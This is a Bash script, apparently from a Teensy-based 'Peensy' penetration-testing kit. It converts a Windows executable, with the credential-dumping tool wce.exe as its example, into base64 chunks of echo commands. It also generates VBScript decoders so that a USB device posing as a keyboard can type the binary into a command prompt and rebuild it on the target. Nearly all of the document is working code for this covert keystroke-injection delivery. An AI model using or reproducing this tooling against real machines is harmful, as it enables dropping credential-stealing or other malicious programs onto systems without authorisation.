#!/bin/bash

# This script was hacked up in a few minutes, and makes many assumptions.
#
# Short version: Example of converting wce.exe for the Peensy:
#------------------- 
# 1. Use short executable names (FAT 12/16 compliant) with a single period in them.
# 2. Run The command "./teensy-payload-split.sh wce.exe" - this will output files into the "converted" folder.
# 3. Copy over the contents of the created folder "converted" into the root directory of the Teensy.
# 4. Have the file dumped by the Teensy like so: type_internal_sd_binary("wce"); (notice, no extension).
# 5. Make sure you call this function when the keyboard focus in inside a command prompt.
#
# Long version:
#----------------
# The executable file is base64 encoded, and split into 8k chunks, to fit the windows cmd.exe buffer limit (8192).
# The created files will have numbers appended them, which can then be easily dealt with by the Peensy "type_internal_sd_binary"
# function, shown below:

#############################################################################################################################
# void type_internal_sd_binary(char *binaryname)
# {
#	char *buf = (char *)malloc(32);
#	unsigned int i = 0;
#	unsigned int results;
#	do {
#		snprintf(buf,31, "%s%d.txt", binaryname,i);
#		results = type_internal_sd_file(buf);
#		delay(1000);
#		memset(buf, 0x00, sizeof(buf));
#		i++;
#	}
#	while(results != 1);
#	
#	// Type out the packer and decoder
#	type_internal_sd_file("remove.txt"); // this will dump a vbscript which removes end of lines from the txt file. 
#	delay(1000);
#	type_internal_sd_file("unpack.txt"); // this will dump a vscript which converts the fixed base64 txt to a binary.
#	delay(1000);
#	type_internal_sd_file(binaryname); // this file will run the vbs scripts requires to fix and convert the file.
#	delay(1000);
# }
#############################################################################################################################
# (The type_internal_sd_file function simply types out a file stored on the Teensy to the Keyboard. For this to be meaningful, 
# the focus of the keyboard should be inside a command prompt.)
#
# So, if a 20kb file.exe were to be processed by this script, it would be split into: file0.txt, file1.txt, file2.txt.
# type_internal_sd_binary("file"); will instruct the Teensy to type type them all out in numerial order, until no more 
# files are found. Then two more vbscript files are dumped to disk: remove.txt and unpack.txt. The first, removes end 
# of line and similar charachters from the dumped file, while the latter converts the base64 encoded string to a binary 
# file. Do not be confused by the .txt file extension of these files... as their contents are typed into a command prompt, 
# these files echo themselves into their corresponding vbs extension.
#

if [ -z "$1" ];then
	echo -e "\n[*] Really rough \"Exe to Peensy\" conversion script".
	echo -e "[*] Will split and output a binary file into ./converted.\n"
	echo -e "\n[*] Usage: $0 file.exe\n"
	exit 0;
fi

#

#rm -rf converted
mkdir -p converted
base64 $1 > zip.txt
name=$(echo -n $1|cut -d"." -f1)
cd converted
cp ../zip.txt .
rm -rf part*
split -b 8000 zip.txt
n=0

echo > $name.txt

for file in $(ls x*);do 
	sed 's/^/echo\ /' $file | sed 's/$/>>file.txt /g'>$name$n.txt
	(( n += 1 )) 
done


### Script to remove space, end of line, cr from echo'd commands
### http://www.techonthenet.com/ascii/chart.php  

cat <<EOF >remove.txt
echo Const ForReading = 1 > remove.vbs
echo Const ForWriting = 2 >> remove.vbs
echo Set objFSO = CreateObject("Scripting.FileSystemObject")>> remove.vbs 
echo Set objFile = objFSO.OpenTextFile("file.txt", ForReading)>> remove.vbs
echo strText = objFile.ReadAll>> remove.vbs
echo objFile.Close>> remove.vbs
echo strNewText = Replace(strText, chr(032), "")>> remove.vbs
echo strNewText1 = Replace(strNewText, chr(013), "")>> remove.vbs
echo strNewText2 = Replace(strNewText1, chr(010), "")>> remove.vbs
echo Set objFile = objFSO.OpenTextFile("file.txt", ForWriting)>> remove.vbs
echo objFile.WriteLine strNewText2>> remove.vbs
echo objFile.Close>> remove.vbs
EOF



### Unpack base64 string in vbscript
### Usage: cscript unpack.vbs base64.txt binary.exe

cat <<EOF>unpack.txt
echo Option Explicit:Dim arguments, inFile, outFile:Set arguments = WScript.Arguments:inFile = arguments(0):outFile = arguments(1):Dim base64Encoded, base64Decoded, outByteArray:dim objFS:dim objTS:set objFS = CreateObject("Scripting.FileSystemObject"):set objTS = objFS.OpenTextFile(inFile, 1):base64Encoded = objTS.ReadAll:base64Decoded = decodeBase64(base64Encoded):writeBytes outFile, base64Decoded:private function decodeBase64(base64):dim DM, EL:Set DM = CreateObject("Microsoft.XMLDOM"):Set EL = DM.createElement("tmp"):EL.DataType = "bin.base64":EL.Text = base64:decodeBase64 = EL.NodeTypedValue:end function:private Sub writeBytes(file, bytes):Dim binaryStream:Set binaryStream = CreateObject("ADODB.Stream"):binaryStream.Type = 1:binaryStream.Open:binaryStream.Write bytes:binaryStream.SaveToFile file, 2:End Sub > unpack.vbs
EOF

echo cscript remove.vbs >> $name.txt
echo cscript unpack.vbs file.txt $1 >> $name.txt
echo >> $name.txt

unix2dos part*.txt 2> /dev/null
rm -rf x* zip.txt
cd ..
